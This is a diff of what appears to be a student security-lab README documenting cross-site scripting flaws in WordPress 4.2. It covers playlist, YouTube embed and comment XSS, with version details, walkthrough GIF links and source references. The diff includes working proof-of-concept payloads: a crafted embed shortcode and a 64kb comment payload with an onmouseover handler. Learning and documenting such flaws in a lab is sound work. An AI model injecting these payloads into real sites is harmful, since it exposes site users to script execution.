@@ -9,7 +9,7 @@ Time spent: **8** hours spent in total
 1. (Required) Audio Playlist Cross-Site Scripting
   - [X] Summary: 
     - Vulnerability types: XSS
-    - Tested in version: 4.2.2
+    - Tested in version: 4.2
     - Fixed in version: 4.7.3
   - [X] GIF Walkthrough:
     - [GIF LINK](https://raw.githubusercontent.com/981014/Week-7-Project-WordPress-vs.-Kali/master/XSS%20Playlist.gif)
@@ -22,7 +22,7 @@ Time spent: **8** hours spent in total
 2. (Required) Youtube Embedded Cross-Site Scripting
   - [X] Summary: 
     - Vulnerability types: XSS
-    - Tested in version: 4.2.2
+    - Tested in version: 4.2
     - Fixed in version: 4.7.3
   - [X] GIF Walkthrough:
     - [GIF LINK](https://raw.githubusercontent.com/981014/Week-7-Project-WordPress-vs.-Kali/master/XSS%20Youtube.gif)
@@ -30,15 +30,18 @@ Time spent: **8** hours spent in total
     - Create a post with the following text: ```[embed src='http://www.youtube.com/embed/sss\x3csvg onload=alert(1)\x3e'][/embed]```
   - [X] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/trunk/src/wp-includes/embed.php)
-3. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+3. (Required) Comment Cross-Site Scripting
+  - [X] Summary: 
+    - Vulnerability types: XSS
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.1
+  - [X] GIF Walkthrough:
+    - [GIF LINK](https://raw.githubusercontent.com/981014/Week-7-Project-WordPress-vs.-Kali/master/XSS%20Comment.gif)
+  - [X] Steps to recreate:
+    - Paste the following text in a comment: ```<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>```
+    - Make sure the character length is 64kb or more.
+  - [X] Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/trunk/src/wp-admin/comment.php)
 4. (Optional) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
